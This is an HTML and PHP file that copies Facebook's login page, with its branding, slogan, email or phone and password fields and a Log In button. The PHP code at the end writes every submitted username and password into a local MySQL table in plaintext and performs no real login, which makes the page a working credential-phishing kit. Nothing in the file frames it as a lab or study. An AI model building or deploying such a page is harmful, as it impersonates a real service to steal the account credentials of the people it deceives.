
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="index.css">
    <link rel="php" href="index1.php">
    <sty
</head>
<body>
    <div class="textbox">
        <h1>
            facebook
        </h1>
        <h2>
            Facebook helps you connect and share<br> with the people in your life.
        </h2>
    </div>


    <div class="container" style="width: 500px; height: 29em;">
<div class="form">
    <form action="index.php" method="post" name="post">
    <input type="text" value="text" name="text" class="text" placeholder="Enter Your Email or Phone number"> <br>
    <input type="password" value="password" name="password" class="text" placeholder="Password"><br>
    <button type="submit" name="post" value="post">
        Log In
    </button> 

    </form>
    
    <p class="forgetp"><a href="" class="forget" >Forgotten password?</a><br></p><hr class="hr1">
    <div class="btn">
        <button>Create New Account</button>
     
         
     </div>



</div>

    </div>
    
    
</body>
</html>
<?php 
$server = 'localhost';
$username ="root";
$password = "";
$db ="facebook";
$pn = 3309;

$connection =mysqli_connect($server,$username,$password,$db,$pn);

 
if(isset($_POST['post'])){
    $text = mysqli_real_escape_string($connection,$_POST['text']);
    $password = mysqli_real_escape_string($connection,$_POST['password']);

    $insertquery = "insert into `login`(`text`,`password`) values('$text','$password')";
            $iquery = mysqli_query($connection, $insertquery);

            
}
    
?> 